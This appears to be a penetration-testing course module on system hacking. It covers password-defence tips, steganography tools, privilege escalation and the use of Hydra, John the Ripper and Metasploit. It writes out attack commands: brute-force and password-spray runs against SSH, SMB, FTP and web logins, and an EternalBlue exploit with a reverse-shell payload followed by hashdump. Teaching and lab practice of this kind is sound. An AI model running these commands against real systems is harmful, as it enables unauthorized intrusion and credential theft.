üéØ Module Overview

üîç What is System Hacking?

System hacking, also known as intrusion or unauthorized access, refers to the process of exploiting weaknesses in computer systems, networks, or applications. The motives of these attacks can vary widely, ranging from data theft and system manipulation to installing malicious software or even creating backdoors for future access.

  • Learn application execution and persistence techniques
  • Explore steganography and data hiding methods
  • Develop skills in covering tracks and log clearing
  • Practice with industry-standard tools like Metasploit, John the Ripper, and Hydra

üõ°Ô∏è Defense Strategies

Password Security Best Practices

Defend Against Password Cracking: 1. Enable InfoSec audit to track pwd attacks 2. Avoid pwd reuse 3. Don't share pwd 4. Don't use dictionary words (in any language) 5. Don't use cleartext or weak encryption 6. Frequent pwd change policy <30 days 7. Secure pwd storage 8. NEVER use default pwd 9. Many characters of multiple types 10. Don't let apps store pwd 11. Use salt prefix or suffix (yours or system's) 12. SYSKEY 13. Never user dates of birth, names 14. Monitor svr logs for brute force atk 15. Account lockout (strict settings)

üñºÔ∏è Steganography & Data Hiding

üé≠ What is Steganography?

Steganography is the process of hiding data in other types of data such as images or text files. The most popular method of hiding data in files is to utilize graphic images as hiding places. Attackers can embed any information in a graphic file using steganography.

üõ†Ô∏è Steganography Tools

ImageHide

ImageHide is a steganography program that hides large amounts of text in images. Even after adding bytes of data, there is no increase in the image size.

Snow

Snow is a whitespace steganography program that conceals messages in ASCII text by appending whitespace to the end of lines.

Blindside

Blindside is a steganography application that hides information inside BMP (bitmap) images.

CameraShy

CameraShy works with Windows and Internet Explorer and lets users share censored or sensitive information stored in an ordinary GIF image.

üîç Steganalysis - Detection Methods

Steganography can be detected by some programs, although doing so is difficult. The first step in detection is to locate files with hidden text, which can be done by analyzing patterns in the images and changes to the color palette.

üéØ Gaining Access

The first phase involves exploiting vulnerabilities to gain initial system access. Common methods include:

  • Password Attacks: Dictionary, brute force, and rainbow table attacks
  • Buffer Overflows: Exploiting memory corruption vulnerabilities
  • Social Engineering: Manipulating users to reveal credentials
  • Web Application Attacks: SQL injection, XSS, and other web exploits
  • Network Attacks: Man-in-the-middle, ARP spoofing
# Example: SSH brute force with Hydra hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10 # Example: SMB password spray crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt
×

‚¨ÜÔ∏è Privilege Escalation

Once initial access is obtained, attackers seek to elevate privileges:

  • Vertical Escalation: Moving from user to administrator/root
  • Horizontal Escalation: Accessing other user accounts at same level
  • Kernel Exploits: Exploiting OS vulnerabilities
  • Service Misconfigurations: Abusing poorly configured services
  • SUID/SGID Binaries: Exploiting elevated permissions
# Windows privilege escalation with Metasploit use post/multi/recon/local_exploit_suggester set SESSION 1 exploit # Linux SUID enumeration find / -perm -u=s -type f 2>/dev/null

üîê John the Ripper

John the Ripper is a fast password cracker, currently available for many flavors of Unix, Windows, DOS, and OpenVMS.

Key Features:

  • Automatic hash type detection
  • Multiple attack modes (dictionary, incremental, external)
  • Rule-based password generation
  • Distributed computing support
  • Custom character sets

Common Usage:

# Basic hash cracking john --format=nt hashes.txt # Dictionary attack john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt # Show cracked passwords john --show hashes.txt # Incremental mode john --incremental hashes.txt # Using rules john --rules --wordlist=wordlist.txt hashes.txt
×

Hydra is a parallelized login cracker which supports numerous protocols to attack.

Supported Protocols:

  • SSH, FTP, HTTP(S), SMB, RDP
  • MySQL, PostgreSQL, Oracle
  • Telnet, POP3, IMAP
  • SNMP, VNC, and many more

# SSH brute force hydra -l user -P wordlist.txt ssh://192.168.1.10 # HTTP form attack hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" # FTP brute force hydra -L users.txt -P passwords.txt ftp://192.168.1.10 # SMB attack hydra -l administrator -P passwords.txt smb://192.168.1.10

üéØ Metasploit Framework

The Metasploit Framework is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development.

Core Components:

  • Exploits: Code that takes advantage of vulnerabilities
  • Payloads: Code executed after successful exploitation
  • Auxiliary: Supporting modules (scanners, fuzzers)
  • Post: Post-exploitation modules
  • Encoders: Payload obfuscation

Basic Workflow:

# Start Metasploit msfconsole # Search for exploits search type:exploit platform:windows # Use an exploit use exploit/windows/smb/ms17_010_eternalblue # Set target set RHOSTS 192.168.1.10 # Set payload set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 192.168.1.100 # Execute exploit exploit # Post-exploitation hashdump getuid sysinfo
